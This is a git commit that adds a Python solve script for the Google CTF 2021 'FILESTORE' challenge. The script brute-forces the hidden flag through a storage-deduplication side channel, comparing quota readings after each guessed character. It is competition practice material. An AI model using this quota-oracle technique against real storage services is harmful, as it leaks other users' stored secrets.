5f9202386e636bb0139c32d59f8c02576aa2ad5c
Takuya Iwase <tanu.z0uz0u@gmail.com>
2021-08-08 00:17:39 +0900

    [googleCTF2021][misc] FILESTORE solve.py追加

---
+++ Competition/googleCTF2021/misc/filestore/solve.py
@@ -0,0 +1,82 @@
+# -*- coding: utf-8 -*-
+from pwn import *
+import string
+import re
+
+# check the flag length
+conn = remote('filestore.2021.ctfcompetition.com', 1337)
+conn.recvuntil("exit")
+conn.sendline(b"status")
+received = conn.recvuntil(b"Menu").decode()
+match = re.search(r"Quota: (.+)/64.000kB", received)
+target_quota = match[1]
+conn.close()
+
+valid = []
+
+for char in string.printable[:-6]:
+    conn = remote('filestore.2021.ctfcompetition.com', 1337)
+    conn.recvuntil("exit")
+    conn.sendline(b"store")
+    conn.recv()
+    conn.sendline(f"{char}")
+    conn.recvuntil("Menu")
+
+    conn.sendline(b"status")
+    received = conn.recvuntil("Menu").decode()
+    match = re.search(r"Quota: (.+)/64.000kB", received)
+
+    quota = match[1]
+    if quota == target_quota:
+        print(f"{char} works!")
+        valid.append(char)
+
+    conn.close()
+
+print(valid)
+
+#################################################################
+# check byte array size of blob
+def checkQuota(flagpart):
+    conn = remote('filestore.2021.ctfcompetition.com', 1337)
+    conn.recvuntil("exit")
+    conn.sendline(b"store")
+    conn.recv()
+    conn.sendline(f"{flagpart}")
+    conn.recvuntil("Menu")
+    conn.sendline(b"status")
+    received = conn.recvuntil("Menu").decode()
+    match = re.search(r"Quota: (.+)/64.000kB", received)
+    quota = match[1]
+    return quota
+
+# valid = ['0', '1', '3', '4', 'c', 'd', 'f', 'i', 'n', 'p', 't', 'u', 'C', 'F', 'M', 'R', 'T', '_', '{', '}']
+flagpart = ''
+
+# find first 16 letter flag
+firstflag = 'CTF{'
+for i in range(12):
+    for char in valid:
+        flagpart = firstflag + char
+        quota = checkQuota(flagpart)
+        if quota == target_quota:
+            firstflag += char
+            print("The first flag is", firstflag, "...")
+            conn.close()
+            break
+        conn.close()
+
+# find last 10 letter flag
+lastflag = '}'
+for i in range(10):
+    for char in valid:
+        flagpart = char + lastflag
+        quota = checkQuota(flagpart)
+        if quota == target_quota:
+            lastflag = char + lastflag
+            print("The last flag is", "...", lastflag)
+            conn.close()
+            break
+        conn.close()
+
+print("The flag is", firstflag + lastflag)
